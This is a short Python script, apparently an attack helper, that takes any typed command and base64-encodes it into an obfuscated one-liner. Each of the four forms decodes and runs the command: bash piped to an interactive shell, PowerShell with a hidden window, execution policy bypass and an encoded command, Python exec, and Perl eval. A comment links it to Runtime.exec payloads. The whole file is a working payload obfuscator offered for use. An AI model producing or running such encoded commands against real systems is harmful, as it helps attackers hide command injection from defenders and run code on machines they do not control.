#!/usr/bin/env python3

import os
import sys
import base64

# cmd can be single line or multi line
# but for now, let's just stick to single line

def encode_bash( cmd ):
    to_encode_cmd = cmd.encode('utf8')
    encoded_cmd = base64.b64encode(to_encode_cmd).decode('utf8') 
    return 'bash -c {echo,' + encoded_cmd + '}|{base64,-d}|{bash,-i}'''

def encode_powershell( cmd ):
    # dont know why, but http://jackson.thuraisamy.me/runtime-exec-payloads.html did like this
    to_encode_cmd = ''
    for c in cmd:
        to_encode_cmd = to_encode_cmd + c + "\x00"
    to_encode_cmd = to_encode_cmd.encode('utf8')
    encoded_cmd = base64.b64encode(to_encode_cmd).decode('utf8') 
    return 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + encoded_cmd

def encode_python( cmd ):
    to_encode_cmd = cmd.encode('utf8')
    encoded_cmd = base64.b64encode(to_encode_cmd).decode('utf8') 
    return "python -c exec('" + encoded_cmd + "'.decode('base64'))"

def encode_perl( cmd ):
    to_encode_cmd = cmd.encode('utf8')
    encoded_cmd = base64.b64encode(to_encode_cmd).decode('utf8') 
    return "perl -MMIME::Base64 -e eval(decode_base64('" + encoded_cmd + "'))"

def main():
    number_to_func_map = {
        0: 'bash',
        1: 'powershell',
        2: 'python',
        3: 'perl',
    }
    for language_index, language in number_to_func_map.items():
        print( language_index, ':', language )
    language_index = input( 'choose cmd language:' ).strip()
    language_index = int( language_index )
    language = number_to_func_map[language_index]
    print( 'you choosed', language )
    exec( 'locals()["f"] = encode_'+language, globals(), locals() )
    language_encode_func = locals()['f']
    cmd = input( 'cmd:' ).strip()
    print( '-'*30 )
    print( language_encode_func( cmd ) )
    print( '-'*30 )

if __name__=='__main__':
    main()
